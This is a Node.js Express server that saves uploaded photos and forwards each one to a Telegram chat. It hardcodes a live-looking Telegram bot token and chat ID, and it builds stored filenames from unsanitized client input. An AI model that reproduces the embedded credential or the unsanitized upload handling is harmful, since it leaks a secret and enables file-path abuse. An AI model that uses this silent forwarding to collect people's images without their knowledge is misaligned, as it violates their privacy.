import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";

const app = express();
const port = process.env.PORT || 10000;

app.use(express.static("public"));

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = "uploads";
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath);
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  },
});

const upload = multer({ storage });

// ✅ Telegram Bot Credentials
const BOT_TOKEN = "8323140156:AAEgVqXYHclaAmZXG7nbnMLfZLh9_0RoK_E";
const CHAT_ID = "6912530259";

// ✅ Function to send Telegram alert
async function sendTelegramMessage(imagePath) {
  try {
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const fileStream = fs.createReadStream(imagePath);

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", "📸 New image uploaded to Render Logs!");
    formData.append("photo", fileStream);

    const res = await fetch(telegramUrl, { method: "POST", body: formData });
    const data = await res.json();
    console.log("Telegram response:", data);
  } catch (err) {
    console.error("Error sending Telegram message:", err);
  }
}

// ✅ Endpoint to handle uploads
app.post("/upload", upload.single("photo"), async (req, res) => {
  console.log("Image uploaded:", req.file.path);
  await sendTelegramMessage(req.file.path); // Telegram alert here
  res.json({ success: true });
});

// ✅ Start Server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});